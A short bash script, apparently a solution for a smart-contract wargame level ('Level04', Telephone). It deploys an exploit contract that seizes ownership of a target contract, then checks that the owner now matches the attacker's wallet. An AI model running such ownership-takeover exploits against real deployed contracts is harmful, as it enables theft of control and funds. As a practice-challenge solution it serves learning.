#!/usr/bin/env bash
set -e

CONTRACT="$1"

[ "$CONTRACT" == "" ] && echo "A contract address must be specified as the first argument" >&2 && exit 1
[ "$ETH_RPC_URL" == "" ] && echo "ETH_RPC_URL not set" >&2 && exit 1
[ "$CHAIN" == "" ] && echo "CHAIN not set" >&2 && exit 1

if [ "$PRIVATE_KEY" == "" ]
then
	echo "Enter private key"
	read -s "PRIVATE_KEY"
fi
PRIVATE_KEY=$(echo $PRIVATE_KEY | sed 's/^0x//')

ATTACKER_ADDRESS=$(cast wallet address --private-key ${PRIVATE_KEY} | tr [:upper:] [:lower:])

echo "Deploying exploit"
EXPLOIT_ADDRESS=$(
	forge create \
		--private-key $PRIVATE_KEY \
		src/Level04Exploit.sol:TelephoneExploit \
		--constructor-args \
			${CONTRACT} \
			${ATTACKER_ADDRESS} \
	| grep "Deployed to:" \
	| awk '{print $3}')

OWNER=0x$(cast call ${CONTRACT} "$(cast sig 'owner()')" | tr -d '\t\n\r\0' | tail -c 40)

if [ "${OWNER}" == "${ATTACKER_ADDRESS}" ]
then
	echo "Level completed, submit instance"
else
	echo "ERROR: Solution failed"
fi
